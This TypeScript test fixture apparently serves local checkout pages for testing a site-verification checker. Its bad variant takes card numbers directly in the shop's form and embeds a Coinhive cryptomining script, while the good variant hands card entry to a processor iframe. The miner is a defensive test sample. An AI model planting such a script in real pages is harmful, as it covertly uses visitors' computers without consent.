/**
 * A checkout that takes the card itself, and one that hands it to a processor.
 *
 * The three criteria rubric 1.1.0 added are the three questions the
 * verification page asks on a visitor's behalf, and every one of them turns
 * "no finding" into a tick. So each needs a page that fails it and a page that
 * does not — a check that has only ever been run against something broken has
 * not been shown to distinguish, and here that failure mode would print a tick.
 *
 * `?good=1` serves the same shop with the card handed to a processor's frame,
 * the miner gone, and somebody to write to.
 *
 * `?both=1` is the one in between, and it is the common one: the processor's
 * frame is on the page and the card fields are in the merchant's document
 * anyway — a half-migrated checkout, or a "save this card" box beside a hosted
 * one. The finding used to be withheld for it, on the strength of the frame.
 */
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';

export interface CheckoutFixture {
  readonly url: string;
  readonly host: string;
  close(): Promise<void>;
}

function page(good: boolean, both = false): string {
  if (both) {
    return `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Kettle Shop</title></head>
<body>
  <h1>Kettle Shop</h1>
  <iframe src="https://js.stripe.com/v3/elements-inner-card" title="Saved card"></iframe>
  <form method="post" action="/charge">
    <label for="cc">Card number</label>
    <input id="cc" name="card_number" autocomplete="cc-number">
    <button type="submit">Pay</button>
  </form>
  <p>Write to <a href="mailto:help@kettle.test">help@kettle.test</a>. Kettle Shop (Pty) Ltd.</p>
</body></html>`;
  }
  return page_(good);
}

function page_(good: boolean): string {
  return `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Kettle Shop</title></head>
<body>
  <h1>Kettle Shop</h1>
  <p>One kettle, fairly priced.</p>

  ${
    good
      ? `<!-- The card never enters this document: the fields live in the
           processor's own frame, which is the entire point of the arrangement. -->
  <iframe src="https://js.stripe.com/v3/elements-inner-card" title="Card details"></iframe>
  <p>Questions? Write to <a href="mailto:help@kettle.test">help@kettle.test</a>, or call
     <a href="tel:+27115550100">+27 11 555 0100</a>. Kettle Shop (Pty) Ltd, Cape Town.</p>`
      : `<form method="post" action="/charge">
    <label for="cc">Card number</label>
    <input id="cc" name="card_number" autocomplete="cc-number" placeholder="4242 4242 4242 4242">
    <label for="cvc">CVC</label>
    <input id="cvc" name="cvc" placeholder="123">
    <button type="submit">Pay</button>
  </form>
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
  <script>var miner = new CoinHive.Anonymous('site-key'); miner.start();</script>`
  }
</body></html>`;
}

export async function startCheckoutPage(): Promise<CheckoutFixture> {
  const server: Server = createServer((request, response) => {
    const url = new URL(request.url ?? '/', 'http://localhost');
    response.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    response.end(page(url.searchParams.get('good') === '1', url.searchParams.get('both') === '1'));
  });

  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  const { port } = server.address() as AddressInfo;

  return {
    url: `http://127.0.0.1:${port}/`,
    host: `127.0.0.1:${port}`,
    async close() {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    },
  };
}
